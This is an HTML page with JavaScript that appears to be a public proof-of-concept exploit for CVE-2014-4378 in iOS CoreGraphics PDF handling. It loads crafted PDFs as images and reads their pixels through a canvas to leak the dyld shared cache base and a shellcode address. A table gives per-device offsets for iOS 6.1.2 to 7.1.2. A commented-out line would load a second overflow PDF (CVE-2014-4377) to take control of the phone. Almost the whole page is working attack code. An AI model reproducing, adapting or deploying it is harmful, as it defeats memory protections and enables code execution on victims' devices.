<html>
    <head>
    </head>
    <body id='body' onload="on_load_body()" >
        <!--img id="pdffill" src=""/><br/>
        <img id="pdffill" src="fillA0.pdf#"/><br/-->
        <img id="pdfleak_code" onload="on_load_pdf_leak_code()"/><br/>
        <img id="pdfleak_data" onload="on_load_pdf_leak_data()"/><br/>
        <img id="pdfcrash"     onload="on_load_pdf_crash()"/><br/>
        <div id="main" />

        <script>
        var CtrlAddress = 0; //global
        var DyldSharedCacheBase = 0; //global
        var Version = ""; //global
        var debug = 0;

        function decimalToHex(d, padding) {
            var hex = Number(d).toString(16);
            padding = typeof (padding) === "undefined" || padding === null ? padding = 2 : padding;
            while (hex.length < padding) {
                hex = "0" + hex;
            }
            return hex;
        }

        function decimalToHex64(d) {
            var hex = d.toString(16)
            while (hex.length < 16) {
                hex = "0" + hex;
            }
            return "0x"+hex;
        }

        function pack32(i){
            var low = (i & 0xffff);
            var high = ((i>>16) & 0xffff);
            return String.fromCharCode(low)+String.fromCharCode(high);
        }

        function unpack32At(s, pos){
            return  s.charCodeAt(pos) + (s.charCodeAt(pos+1)<<16);
        }

        function pack(i){
            var low = (i & 0xffff);
            var high = ((i >> 16) & 0xffff);
            return String.fromCharCode(low)+String.fromCharCode(high);

        }
        function packs(s){
            result = "";
            for (i=0; i<s.length; i+=2)
                result += String.fromCharCode(s.charCodeAt(i) + (s.charCodeAt(i+1) << 8));
                return result;
        }

        function my_alert(msg){
            //Comment or Uncomment to control debug mode                             <===
            alert(msg); 
        }

        function on_load_body(){
            my_alert("on_load_body: "+navigator.userAgent);
            //Load leak pdf. Objective leak CoreGraphics Address.
            document.getElementById("pdfleak_code").src="leak_code.pdf?"+Math.random();
        }

        function on_load_pdf_leak_code(){
            //my_alert("on_load_pdf_leak_code");
            var img = document.getElementById("pdfleak_code");
            var canvas = document.createElement('canvas');
            var pixelData;
            var content;
            canvas.width = img.width;
            canvas.height = img.height;

            canvas.getContext('2d').drawImage(img, 0, 0, img.width, img.height);
            pixelData = canvas.getContext('2d').getImageData(0, 0, img.width, img.height).data;

            var leak = new Array();
            for (var i=0; i<img.width*img.height*4; i+=1){
                if ( (1+i)%4 == 0 )
                    continue;
                leak[leak.length] = pixelData[i];
            }
            img.parentNode.removeChild(img);

            var _targets = [ { "byte0": 0xd5, "byte1": 0x29, "byte2": 0x29, "agent": "7_0_4 ",
                                                    "version": "iPhone3,1-7.0.4",
                                                    "dyld_shared_cache_offset":  0x15339d5 },
                             { "byte0": 0x41, "byte1": 0x95, "byte2": 0x95,  "agent": "7_1 ",
                                                    "version": "iPhone4,1-7.1", 
                                                    "dyld_shared_cache_offset": 0x2f738b41 - 0x2e17d000 },
                             { "byte0": 0x8d, "byte1": 0xdd, "byte2": 0xdd, "agent": "7_1 ",
                                                    "version": "iPhone5,1-7.1", 
                                                    "dyld_shared_cache_offset": 0x2d6d8f8d - 0x2c116000},
                             { "byte0": 0x8d, "byte1": 0xdd, "byte2": 0xdd, "agent": "7_1_1",
                                                    "version": "iPhone5,1-7.1.1", 
                                                    "dyld_shared_cache_offset": 0x015c2f8d },
                             { "byte0": 0xa9, "byte1": 0xf9, "byte2": 0xf9, 
                                                    "version": "iPhone5,1-7.1.2", 
                                                    "dyld_shared_cache_offset": 0x015a9ca9 },
                             { "byte0": 0x71, "byte1": 0xc5, "byte2": 0xc5, 
                                                    "version": "iPhone4-7.1.2", 
                                                    "dyld_shared_cache_offset": 0x01598571 },
			     { "byte0": 0x51, "byte1": 0xa9, "byte2": 0xb1, "agent": "6_1_2",
			                             "version": "iPhone3,1-6.1.2",
						     "dyld_shared_cache_offset": 0x0124b151 }, //via @SwissHttp

                            ];
            var l = '';
            var pos = -1;
            var offset = 0 ;
            for(var i = 0; i<leak.length; i++){
                //console.info(i+": "+decimalToHex(leak[i]));
                l = l +'.' + decimalToHex(leak[i]);
                for(var j = 0; j< _targets.length; j++){
                    var _target = _targets[j];
                    if (pos == -1  && i > 8 && leak[i-8] == _target["byte0"]  && leak[i-4] == _target["byte1"] && leak[i] == _target["byte2"]){
                        if (_target.hasOwnProperty("agent") && navigator.userAgent.indexOf(_target["agent"]) == -1){
                            continue;
                        }
                        Version = _target["version"];
                        offset = _target["dyld_shared_cache_offset"];
                        pos = i-8;
                        break;
                    }
                }
            }
            if (pos==-1){
                my_alert("DyldSharedCacheBase and the IOS version were NOTFOUND. This target is not supported or not vulnerable. Check the PORTING instructions here: https://github.com/feliam/CVE-2014-4378:\n"+l);
                location.reload();
            }
            DyldSharedCacheBase = 0; //global
            for (var i = 3; i >= 0; i--){
                DyldSharedCacheBase = DyldSharedCacheBase * 256 + leak[pos+i];
            }
            DyldSharedCacheBase = DyldSharedCacheBase - offset;
            //my_alert("DyldSharedCacheBase:"+DyldSharedCacheBase.toString(16) + "\nVersion: "+Version);

            //DyldSharedCacheBase address done. Next goal, get controled data at known address.
            //Load leak_data pdf.
            document.getElementById("pdfleak_data").src="leak_data.pdf?"+Math.random();
            }

        function on_load_pdf_leak_data(){
            //my_alert("on_load_pdf_leak_data");
            var img = document.getElementById("pdfleak_data")
            var canvas = document.createElement('canvas');
            var pixelData;
            var content;
            canvas.width = img.width;
            canvas.height = img.height;

            canvas.getContext('2d').drawImage(img, 0, 0, img.width, img.height);
            pixelData = canvas.getContext('2d').getImageData(0, 0, img.width, img.height).data;

            var leak = new Array();
            for (var i=0; i<img.width*img.height*4; i+=1){
                if ( (1+i)%4 == 0 )
                    continue;
                leak[leak.length] = pixelData[i];
            }
            img.parentNode.removeChild(img);

            var l = '';
            var pos = -1;
            for(var i = 0; i<leak.length; i++){
                //console.info(i+": "+decimalToHex(leak[i]));
                l = l +'.' + decimalToHex(leak[i]);
                if ( pos == -1  && i > 4 && leak[i-4] == 0x64  && leak[i-3] == 0x64  && leak[i-2] == 0x64  && leak[i-1] == 0x00  && (leak[i+1] != 0x00 || leak[i+2] != 0x00)){
                    pos = i;
                    //break;
                }
            }
            if (pos==-1){
                my_alert("Something wrong leaking the data. Check the PORTING instructions here: https://github.com/feliam/CVE-2014-4378:\n"+l);
                location.reload();
            }

            CtrlAddress = 0; //global
            for (var i = 3; i >= 0; i--){
                CtrlAddress = CtrlAddress * 256 + leak[pos+i];
            }
            CtrlAddress =  CtrlAddress + 32 + 8;
            my_alert("DyldSharedCacheBase:"+DyldSharedCacheBase.toString(16) + "\nVersion: "+Version + "\nShellcode Addr:"+CtrlAddress.toString(16) + "\nAbout to crash.");
            //Coregraphics and controled data address leaked. Next goal, crash, exploit
	    //The next line should load the overflowding PDF with the detected parameters (see CVE-2014-4377)
            //document.getElementById("pdfcrash").src="/mkCVE20144377/?shellcode=0x"+CtrlAddress.toString(16)+"&baseaddr=0x"+DyldSharedCacheBase.toString(16)+"&version="+Version+"&"+Math.random();
            my_alert("Shellcode at : 0x" +CtrlAddress.toString(16)+"\nShared cache at: 0x"+DyldSharedCacheBase.toString(16)+"\nVersion: "+Version+"\n");
            for(var i = 0; i<10000; i++);

        }

        function on_load_pdf_crash(){
            //my_alert("on_load_pdf_crash");
            var img = document.getElementById("pdfcrash")
            //img.parentNode.removeChild(img);
        }

        </script>
    </body>
</html>
